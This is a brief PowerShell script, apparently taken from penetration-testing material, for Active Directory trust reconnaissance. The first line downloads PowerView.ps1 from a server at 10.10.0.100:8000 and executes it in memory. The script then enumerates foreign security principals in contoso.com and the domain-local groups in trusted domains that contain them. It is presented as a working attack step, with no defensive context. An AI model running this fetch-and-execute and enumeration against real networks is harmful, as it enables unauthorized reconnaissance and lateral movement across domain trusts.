iex (iwr http://10.10.0.100:8000/Power/Rec/PowerView.ps1 -UseBasicParsing);$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://contoso.com" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
$Domains = @{}
 
$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
    # extract the domain the foreign user was added to
    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
    # check if we've already enumerated this domain
    if (-not $Domains[$ForeignUserDomain]) {
        $Domains[$ForeignUserDomain] = $True
        # enumerate all domain local groups from the given domain that have any membership set
        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter '(member=*)' -Properties distinguishedname,member | ForEach-Object {
            # check if there are any overlaps between the domain local groups and the foreign users
            if ($($_.member | Where-Object {$ForeignUsers  -contains $_})) {
                $_
            }
        }
    }
}
 
$ForeignMemberships | fl

